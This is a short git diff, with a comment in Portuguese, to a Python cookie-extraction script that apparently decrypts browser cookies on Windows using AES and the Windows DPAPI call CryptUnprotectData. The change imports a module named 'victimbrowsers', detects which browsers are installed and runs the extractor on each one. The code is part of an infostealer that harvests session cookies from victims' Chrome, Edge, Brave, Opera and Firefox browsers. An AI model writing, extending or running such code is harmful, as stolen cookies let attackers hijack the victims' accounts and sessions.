@@ -5,6 +5,7 @@ import base64
 import json
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
+from victimbrowsers import navegadores_instalados  
 
 
 class CookieExtractor:
@@ -133,9 +134,20 @@ class CookieExtractor:
 
 
 if __name__ == "__main__":
-    browsers = ["chrome", "brave", "opera", "edge", "firefox"]
+    navegadores_suportados = navegadores_instalados()
+    
+    # tem que alterar os nomes retornados para que o extractor encontre, 3 horas até descobrir essa merda
+    navegador_map = {
+        'Chrome': 'chrome',
+        'Firefox': 'firefox',
+        'Edge': 'edge',
+        'Opera': 'opera',
+        'Brave': 'brave'
+    }
 
-    for browser in browsers:
+    navegadores_convertidos = [navegador_map[n] for n in navegadores_suportados if n in navegador_map]
+
+    for browser in navegadores_convertidos:
         extractor = CookieExtractor(browser)
         cookies = extractor.get_cookies()
 
